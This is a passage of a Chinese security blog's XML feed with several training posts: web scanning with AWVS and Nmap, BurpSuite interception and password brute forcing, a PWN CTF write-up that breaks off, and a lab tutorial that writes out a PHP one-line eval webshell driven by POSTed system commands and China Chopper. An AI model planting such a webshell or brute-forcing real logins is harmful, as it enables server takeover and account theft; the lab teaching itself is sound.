alt="dede目录"></p><p>除此之外，还可以直接访问<code>robots.txt</code>文件来查看被网站管理员禁止爬取的一些网站目录，尝试访问这些目录也会有新的发现。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 暑期实训 </tag>
            
            <tag> 御剑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWVS漏洞扫描的使用过程</title>
      <link href="/posts/38f474e5.html"/>
      <url>/posts/38f474e5.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://baymrx.lanzous.com/iG8Pze6m0jg">AWVS下载</a></p><p>测试用网站源文件：<a href="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/other/dedecms5.6.zip">dedecms5.6.zip</a></p></blockquote><h2 id="1-构建测试网站">1.构建测试网站</h2><p>下载dedecms5.6.zip并解压在phpStudy的网站根目录中，并修改端口常规设置</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630192849107.png" alt="image-20200630192849107"></p><p>在端口常规设置中奖网站目录设置为刚才解压的dedecms5.6，设置完成后点击应用保存</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630192941917.png" alt="image-20200630192941917"></p><p>待服务重启后就可以使用浏览器直接访问127.0.0.1看到页面内容</p><h2 id="2-使用AWVS进行扫描">2.使用AWVS进行扫描</h2><p>打开AWVS后，会自动弹出来扫描向导，将本地创建的要扫描的<code>127.0.0.1</code>填入URL中</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630185837774.png" alt="image-20200630185837774"></p><p>然后其他配置使用默认，一路点击下一步就可以开始扫描</p><p>扫描过程会显示扫描过程中获得的信息</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630190046357.png" alt="image-20200630190046357"></p><p>等待一段时间后，就能看到扫描完成并可以点击上方的<code>Report</code>生成一份测试报告</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630195144665.png" alt="image-20200630195144665"></p><p>可以看到软件扫描出很多潜在的高危和中危漏洞，漏洞具体信息可以在报告里查看</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 暑期实训 </tag>
            
            <tag> AWVS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webshell——一句话木马实操</title>
      <link href="/posts/5bdf2698.html"/>
      <url>/posts/5bdf2698.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>本次课程需要用到的工具：<a href="https://www.xp.cn/">phpStudy</a>、<a href="https://doc.u0u.us/zh-hans/getting_started/get_antsword.html">蚁剑</a>和<a href="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/other/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80.zip">中国菜刀</a></p></blockquote><h2 id="1-配置Web环境">1.配置Web环境</h2><p>打开phpStudy启动服务，使得界面的运行状态全部变成绿色，此时可以在浏览器使用<code>127.0.0.1</code>访问Web服务</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630171628057.png" alt="image-20200630171628057"></p><h2 id="2-创建木马文件">2.创建木马文件</h2><p>在phpStudy的界面点击<code>其他选项菜单</code>进入网站的根目录</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630171843749.png" alt="image-20200630171843749"></p><p>在根目录中新建一个PHP的一句话木马文件，命名为<code>hack.php</code>，里面添加木马语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>保存后退出编辑即可</p><h2 id="3-利用Webshell">3.利用Webshell</h2><h3 id="1）使用HackBar插件">1）使用HackBar插件</h3><p>在浏览器中安装HackBar插件，按<code>F12</code>打开开发者工具，访问<code>http://127.0.0.1/hack.php</code>界面不会显示任何东西</p><p>然后点开开发者工具中的HackBar选项卡，将地址栏中的地址粘贴在下面，选中<code>Post Data</code>选项在下面填入<code>aaa=system('ipconfig');</code>，其中这里的<code>aaa</code>是上面在创建木马文件的时候POST里面的参数</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630173613310.png" alt="image-20200630173613310"></p><p>填写完毕后点击<code>Execution</code>就可以通过木马执行服务器中的命令，就可以直接在Web页面看到命令执行后的结果</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630173748175.png" alt="image-20200630173748175"></p><h3 id="2）使用中国菜刀">2）使用中国菜刀</h3><p>打开中国菜刀首先添加一条记录，右键添加</p><p>如图所示，先在地址栏填写一句话木马的URL，后面的框填写木马中POST里面设置的参数，完成后点击添加</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630174244012.png" alt="image-20200630174244012"></p><p>添加后在菜刀的主界面就会出现一条记录，右键这条记录就可以以不同的方式连接到Web服务器主机</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630174729709.png" alt="image-20200630174729709"></p><p>可以通过文件管理对目标主机中的任意文件进行操作，通过虚拟终端可以通过命令行的形式对目标主机进行操控</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630174951633.png" alt="文件管理"></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630175011890.png" alt="命令行控制"></p><h3 id="3）使用蚁剑">3）使用蚁剑</h3><p>使用方法与中国菜刀基本相同</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630175617736.png" alt="image-20200630175617736"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Webshell </tag>
            
            <tag> 蚁剑 </tag>
            
            <tag> 中国菜刀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap的几种常见扫描方式</title>
      <link href="/posts/664e0a31.html"/>
      <url>/posts/664e0a31.html</url>
      
        <content type="html"><![CDATA[<p>Nmap扫描原理：首先会发送ICMP数据包确定探测主机是否存在(存活扫描)，再探测主机存在的端口</p><h2 id="1-Intense-scan（强扫描）">1.Intense scan（强扫描）</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -v [ip_addr]</span><br></pre></td></tr></table></figure><p>-T4：第4强度的扫描（同时扫描端口数的强度）</p><p>-A：探测目标的详细信息</p><p>-v：输出探测过程中的详细信息</p><h2 id="2-Intense-scan-plus-UDP-强扫描-UDP">2.Intense scan plus UDP(强扫描+UDP)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sU -T4 -A -v [ip_addr]</span><br></pre></td></tr></table></figure><p>-sS：（send SYN）TCP SYN探测扫描</p><p>-sU：探测UDP</p><h2 id="3-Intense-scan-all-TCP-ports（强扫描全部TCP端口）">3.Intense scan, all TCP ports（强扫描全部TCP端口）</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-65535 -T4 -A -v [ip_addr]</span><br></pre></td></tr></table></figure><p>-p：探测的端口号</p><h2 id="4-Intense-scan-no-ping">4.Intense scan, no ping</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -v -Pn [ip_addr]</span><br></pre></td></tr></table></figure><p>-Pn：扫描之前不ping远程主机（模拟成TCP连接探测主机是否存活）</p><h2 id="5-Ping-scan">5.Ping scan</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn [ip_addr]</span><br></pre></td></tr></table></figure><p>-sn：只探测存活（与上面的<code>-Pn</code>不能同时使用）</p><h2 id="6-Quick-scan（快速扫描）">6.Quick scan（快速扫描）</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -F [ip_addr]</span><br></pre></td></tr></table></figure><p>-F：快速扫描，减少端口响应等待时间</p><h2 id="7-Quick-scan-plus">7.Quick scan plus</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -T4 -O -F --version-light [ip_addr]</span><br></pre></td></tr></table></figure><h2 id="8-Quick-traceroute（路由追踪）">8.Quick traceroute（路由追踪）</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn --traceroute [ip_addr]</span><br></pre></td></tr></table></figure><p>–traceroute：路由追踪，类似于在Windows中的<code>tracert</code>命令</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 暑期实训 </tag>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite的4种常用功能使用</title>
      <link href="/posts/6e251019.html"/>
      <url>/posts/6e251019.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://portswigger.net/burp/releases/professional-community-2020-5-1">BurpSuite下载</a></p></blockquote><h2 id="包拦截">包拦截</h2><h3 id="1-设置代理">1.设置代理</h3><p>首先设置浏览器的网络代理为HTTP：<code>127.0.0.1:8080</code></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200629171107885-1593430468164.png" alt="image-20200629171107885"></p><blockquote><p>也可以下载使用Firefox的代理插件——<code>SwitchyOmega</code>对浏览器的代理进行管理</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630081807310.png" alt="image-20200630081807310"></p></blockquote><h3 id="2-配置BurpSuite">2.配置BurpSuite</h3><p>在<code>Proxy-Options</code>中添加<code>127.0.0.1:8080</code>代理监听</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200629171421952-1593430468165.png" alt="image-20200629171421952"></p><p>在<code>Proxy-Intercept</code>中打开拦截</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200629171618124-1593430468165.png" alt="image-20200629171618124"></p><h3 id="3-抓包">3.抓包</h3><p>然后刷新重新加载要抓包的网页，就可以在<code>Proxy-Intercept</code>中看到抓取到的请求包</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200629171914635-1593430468165.png" alt="image-20200629171914635"></p><p>可以看到数据包中隐藏的flag，解码后得到<code>flag&#123;2333_surprise&#125;</code></p><p>然后点击<code>Forword</code>可以看到另一个flag：<code>flag&#123;jkca@jncJKe873yfc&#125;</code></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200629172225158-1593430468165.png" alt="image-20200629172225158"></p><h3 id="4-分析（抓回包）">4.分析（抓回包）</h3><p>在访问192.168.47.99网站的时候抓取网站的响应包，在抓取到请求包后右键<code>Do intercept-&gt;Response to this request </code></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200629172734031-1593430468165.png" alt="image-20200629172734031"></p><p>设置抓取响应包后点击<code>Forward</code></p><p>可以看到网站响应返回的数据包</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200629172833279-1593430468165.png" alt="image-20200629172833279"></p><p>其中会有一个自动刷新的设置，进入到网站0.1s后就会刷新到<code>3.php</code>这个文件，使用BurpSuite对网页数据报进行拦截就可以探索到其中的奥妙。</p><h2 id="包回放">包回放</h2><p>包回放类似于DDoS（重放攻击）</p><p>在前面拦截到数据包的基础上，右键选择<code>Send  to Repeater</code></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200629174310308-1593430468165.png" alt="image-20200629174310308"></p><p>然后进入<code>Repeater</code>选项卡</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200629174356973-1593430468165.png" alt="image-20200629174356973"></p><p>点按钮<code>Go</code>，就可以向网站服务器发送Web请求，点多次就可以发送多次请求，多次获取网页数据，这个方法可以用来多次提交订单</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200629174513300-1593430468165.png" alt="image-20200629174513300"></p><h2 id="包修改">包修改</h2><p>在<code>Repeater</code>选项卡中可以直接修改发送的请求包的内容，从而获取不同的响应包</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200629175027117-1593430468166.png" alt="image-20200629175027117"></p><h2 id="爆破攻击">爆破攻击</h2><p>对于某些使用用户名和口令行登录的网站，可以使用BurpSuite自动提交登录请求，并在登陆请求数据中根据设定的用户名或口令列表自动填写用户名或口令，每次请求都会返回一个状态码，可以根据请求返回的状态码判断是否爆破成功。</p><h3 id="1-抓包">1.抓包</h3><p>首先拦截网页的一个请求包</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630085902091.png" alt="image-20200630085902091"></p><p>然后点<code>Forward</code>使网页登陆界面加载出来</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630090003334.png" alt="image-20200630090003334"></p><p>在输入框中随便输入一个密码，提交查询</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630090256922.png" alt="image-20200630090256922"></p><p>BurpSuite会自动拦截登陆提交请求</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630090501046.png" alt="image-20200630090501046"></p><p>可以看到在请求包中存在用户输入的用户名和口令，并且是明文形式</p><h3 id="2-进入Intruder进行爆破">2.进入Intruder进行爆破</h3><p>将数据包右键发送到<code>Intruder</code></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630090620279.png" alt="image-20200630090620279"></p><p>然后进入<code>Intruder</code>选项卡，点击<code>Positions</code>可以看到<code>name</code>和<code>password</code>使用<code>§</code>框起来了</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630091231476.png" alt="image-20200630091231476"></p><p>点击右边的<code>Clear§</code>清除，并选中<code>1234</code>点击<code>Add§</code>，将<code>password</code>的值添加到payload，如图所示</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630091508629.png" alt="image-20200630091508629"></p><p>进入<code>Payloads</code>子选项卡，设置Payload类型、字符集和字符长度通过遍历进行爆破，当然也可以通过字典进行爆破。设置完参数之后，点击右上角的<code>Stack attack</code>开始爆破</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630092421606.png" alt="image-20200630092421606"></p><p>爆破完成后，可以对爆破结果按照返回数据包的长度进行排序，可以看到有一个长度与其他不一样的结果，则前面的<code>Payload</code>即为爆破得到的结果</p><p>点击这个编号为<code>4401</code>的数据包，可以在下面看到<code>Response</code>数据包的内容</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630093000145.png" alt="image-20200630093000145"></p><p>从而拿到flag：<code>flag&#123;baopo_success&#125;</code></p><h2 id="HTTPS的抓包">*HTTPS的抓包</h2><p>BurpSuite默认是抓取不到使用HTTPS协议访问的网页的数据包的，如果直接使用代理访问会提示证书不安全无法访问（如图所示），需要手动导入CA证书才可以使用。</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630104049146.png" alt="image-20200630104049146"></p><h3 id="1-导入证书">1.导入证书</h3><p>首先关闭代理访问<code>127.0.0.1:8080</code>，在页面下载CA证书文件，保存在本机中</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630102420126.png" alt="image-20200630102420126"></p><p>在浏览器的选项设置中进入<code>隐私与安全-安全</code>，点击查看证书</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630102618810.png" alt="image-20200630102618810"></p><p>将刚才下载的证书导入，并信任所有</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630102815041.png" alt="image-20200630102815041"></p><p>点击确定保存后证书即导入成功</p><h3 id="2-使用BP尝试抓取HTTPS数据包">2.使用BP尝试抓取HTTPS数据包</h3><p>打开浏览器的BurpSuite代理，然后访问<a href="https://www.baidu.com/">百度</a>的网站</p><p>点击几次<code>Forward</code>之后就可以看到对应的数据包</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630103240920.png" alt="image-20200630103240920"></p><p><code>Forward</code>点完之后，百度的主页在浏览器中也可以正常显示出来</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 暑期实训 </tag>
            
            <tag> BurpSuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB安全基础知识及综述</title>
      <link href="/posts/6f3adf21.html"/>
      <url>/posts/6f3adf21.html</url>
      
        <content type="html"><![CDATA[<h2 id="ξ1-Web安全综述">ξ1-Web安全综述</h2><h3 id="WEB系统架构">WEB系统架构</h3><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200629100523627.png" alt="image-20200629100523627" style="zoom:25%;" /><h3 id="新的安全问题">新的安全问题</h3><ul><li>SQL注入</li><li>存储型XSS</li><li>文件上传</li><li>……</li></ul><h3 id="OWASP-TOP10">OWASP TOP10</h3><ul><li>注入</li><li>失效的身份认证和会话管理</li><li>XML外部实体（XXE）</li><li>失效的访问控制</li><li>安全配置错误</li><li>跨站脚本（XSS）</li><li>不安全的反序列化</li><li>使用含有已知漏洞的组件</li><li>不足的日志记录和监控</li></ul><h2 id="ξ2-Web安全基础知识">ξ2-Web安全基础知识</h2><h3 id="HTTP协议（超文本传输协议）">HTTP协议（超文本传输协议）</h3><h4 id="HTTP特点">HTTP特点</h4><ul><li><p>HTTP协议建立在TCP协议基础之上</p></li><li><p>HTTP协议是无状态的</p></li></ul><h4 id="URL">URL</h4><ul><li>统一资源定位符，从协议开始，可以唯一确定资源地址的字符串</li></ul><h4 id="URI">URI</h4><ul><li>统一资源标识符，在一定约束条件下可以唯一确定资源地址的字符串（URL中除去域名和端口部分）</li></ul><h3 id="HTTP方法">HTTP方法</h3><ul><li><p>GET：获取资源</p><ul><li><p>获取请求页面的指定消息</p></li><li><p>请求参数在请求头中</p></li><li><p>请求长度有限制</p></li></ul><p>eg：GET /index.php?id=1 HTTP/1.1</p></li><li><p>POST：传输实体主体</p><ul><li>获取请求页面的指定消息</li><li>请求参数在请求正文</li></ul><p>eg：POST /index.php HTTP/1.1</p></li><li><p>HEAD：返回报文首部</p></li><li><p>OPTIONS：询问支持的方法</p></li><li><p>PUT：传输文件</p></li><li><p>DELETE：删除文件</p></li></ul><h3 id="HTTP状态码">HTTP状态码</h3><ul><li>200：客户端请求成功，最常见的内容</li><li>204：请求处理成功，但没有资源返回</li><li>206：客户端进行了范围请求（拒绝全部请求）</li><li>301：永久性重定向，表示资源已经被分配新的URL，以后应使用资源现在所指的URL</li><li>302：临时性重定向，表示资源已经被分配了新的URL，希望用户(本次)能使用新的URL</li><li>304：服务器资源未改变，可直接使用未过期的缓存</li><li>400：请求语法中存在报文错误，需要修改再次发送</li><li>401：该状态码表示需要通过HTTP认证</li><li>403：请求访问的资源服务器拒绝</li><li>404：服务器上没有找到资源</li><li>500：服务器内部错误</li><li>503：服务器当前不能处理客户端的请求</li></ul><h3 id="HTTP首部">HTTP首部</h3><h4 id="HTTP请求报文">HTTP请求报文</h4><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200629160619071.png" alt="image-20200629160619071"></p><h4 id="HTTP响应报文">HTTP响应报文</h4><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200629161125218.png" alt="image-20200629161125218"></p><h3 id="HTTP首部字段">HTTP首部字段</h3><h4 id="请求字段">请求字段</h4><ul><li>Host：请求资源的主机和端口号</li><li>User- Agent：客户端操作系统，浏览器等其他信息</li><li>Referer：访问当前页面的上一个页面</li><li>Cookie：请求者的身份凭证</li><li>Accept：客户端希望接收的哪些MIME类型消息</li><li>Accept-Charset： 指定客户端接收的字符集</li></ul><h4 id="响应字段">响应字段</h4><ul><li>Server：服务器所使用的Web服务名字</li><li>Set-Cookie：向客户端设置Cookie<ul><li>在浏览器客户端中设置一个Cookie，由服务器生成Cookie</li></ul></li><li>Last-Modified：告诉浏览器资源修改的最后时间</li><li>Content-Length：正文长度</li><li>Location：引导用户转向与请求URI不同的资源</li></ul><h2 id="学习Web安全应该注意的问题-ಥ-ಥ">学习Web安全应该注意的问题(ಥ_ಥ)</h2><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200630094855509.png" alt="image-20200630094855509"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Hexo+GitHub搭建自己的个人博客</title>
      <link href="/posts/1135ecbe.html"/>
      <url>/posts/1135ecbe.html</url>
      
        <content type="html"><![CDATA[<p>由于自己之前在GitHub白女票的服务器到期了（再用下去就要自己掏腰包了，学生党受不起o(╥﹏╥)o），所以今天在此将自己的博客移植到永久免费的GitHub中，作为GitHub Pages来继续完成它的使命~（这也算是给自己填坑吧）</p><p>基础的hexo安装与美化这里就不再赘述，可以翻看我之前的文章：</p><p><a href="http://baymrx.me/2019/07/30/%E4%BD%BF%E7%94%A8Hexo-Nginx-Namecheap-DigitalOcean%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/">使用Hexo+Nginx+Namecheap+DigitalOcean搭建个人博客网站</a></p><p><a href="http://baymrx.me/2019/08/02/Hexo%E8%BF%9B%E9%98%B6%E2%80%94%E2%80%94%E4%B8%BB%E9%A2%98%E5%92%8C%E5%8A%9F%E8%83%BD%E7%9A%84%E5%AE%8C%E5%96%84/">Hexo进阶——主题和功能的完善</a></p><p>下面就开始进入正片~~</p><h2 id="创建GitHub仓库">创建GitHub仓库</h2><p>首先咱们需要创建一个GitHub仓库，当然没有GitHub账号需要先注册</p><p>注册完之后点页面右上角创建新的GitHub仓库</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200527182241.png" alt="New resp"></p><p>输入自己项目仓库的名字，我这里是<code>baymrx</code>（注意这里必须使用GitHub的用户名，否则不能成功），记得后面一定要加<code>.github.io</code>后缀，仓库类型设置为共有仓库，下面的REDEME初始化也要勾选</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200527182440.png" alt="Create"></p><h2 id="配置GitHub-Pages">配置GitHub Pages</h2><p>信息填写完成后点击创建，创建完成后进入自己的仓库页面，点击<code>Settings</code>，往下拉到底可以看到GitHub Pages模块，这里可以选择博客的默认主题（当然没啥用），如果已经申请了自己的域名，可以将博客地址设置为自己的域名。</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200527184225.png" alt="GitHub Pages"></p><p>自定义域名设置完保存后，系统会自动在项目的根目录中添加一个CNAME文件，然后要想使用自定义域名访问GitHub Pages，需要添加两条DNS解析记录</p><p>以我的为例</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200527192058.png" alt="DNS"></p><p>配置完成后使用<code>baymrx.me</code>访问，可以正常打开显示出则说明配置成功，下面是我的页面（选择不同主题显示的页面不同）</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/blog%20pages.png" alt="blog pages"></p><h2 id="修改hexo配置">修改hexo配置</h2><p>打开博客根目录下的<code>_config.yml</code>文件，修改最后几行的配置，这里的repo为你项目的git地址</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200527204035.png" alt="config"></p><h2 id="生成并上传博客">生成并上传博客</h2><p>完成后重新生成并上传博客文档</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>通过Git上传后我们的网页文件就在GitHub仓库里了，这时候如果通过域名访问会出现404的情况，是因为在重新上传网页文件后，仓库里本来存在的<code>CNAME</code>也被删除了</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200527202549.png" alt="404"></p><p>我们需要在博客根目录的<code>/source</code>文件夹中创建一个<code>CNAME</code>文件，文件里写入自己的域名</p><p>然后还要创建一个<code>README.md</code>文件，文件内容为</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">## baymrx.github.io</span></span><br><span class="line">BayMRX&#x27;s Blog-GitHub Pages</span><br></pre></td></tr></table></figure><p>然后重新生成上传博客就可以正常访问博客了~~</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN刷题记录——guess_num</title>
      <link href="/posts/5031b5fb.html"/>
      <url>/posts/5031b5fb.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>guess_num:[<a href="https://adworld.xctf.org.cn/media/task/attachments/b59204f56a0545e8a22f8518e749f19f">下载地址</a>]</p></blockquote><h3 id="题目分析">题目分析</h3><p>拿到题目先跑一下康一康</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200119182341023.png" alt="image-20200119182341023"></p><p>是一个猜数的游戏，随便输几次数跑一下，不料第二回合就GG了</p><p>丢到IDA里打探一下</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200119182654177.png" alt="image-20200119182654177"></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200119182705926.png" alt="image-20200119182705926"></p><p>通过分析源代码发现程序会随机产生10个随机数分布在10个回合中，只要每个回合的数字都猜对就可以进入子函数直接获取flag</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200119183111884.png" alt="image-20200119183111884"></p><p>对程序进行安全机制检查发现，程序所有保护都开启了，咋办？有点慌、、</p><p>由于有了堆栈保护，所以程序不能通过栈溢出返回到sub_C3E()函数，这条路子就、、死心吧，只能另寻他路</p><p>既然不能控制程序返回地址，那么我们考虑一下是不是可以控制一下栈上的数据，比如控制用来产生随机数种子得到srand函数。我们知道，srand函数所产生的随机种子是由seed的值确定的，seed一样，rand函数产生的伪随机数值也会一样。</p><p>先看一下程序中的seed是怎么来的</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200119183111884.png" alt="image-20200119185756499"></p><p>看样子是没法直接得知seed的具体值，那么就只能直接开干了</p><p>在IDA里面查看main函数的栈空间可以得知</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200119190320050.png" alt="image-20200119190320050"></p><p>程序中的变量v7即栈空间中的var_30，它在栈中到变量seed的偏移量为0x20</p><h3 id="利用思路">利用思路</h3><p>由于程序中gets函数没有对输入大小进行限制，所以我们可以利用gets函数使v7溢出覆盖到变量seed，使得seed为我们指定的固定值，这样就可以使得每一轮的“随机数”都可以被我们准确地“猜到”，从而获得flag</p><h3 id="EXP编写">EXP编写</h3><h4 id="第一种EXP（笨方法）">第一种EXP（笨方法）</h4><p>我们设置seed的值为1，那么rand随机出来的10个伪随机数就是固定不变的，可以使用C语言代码先把这10个随机数求出来，然后在exp脚本中打表使用</p><p>求随机数的C语言代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    srand(<span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> n=<span class="number">10</span>;</span><br><span class="line">    <span 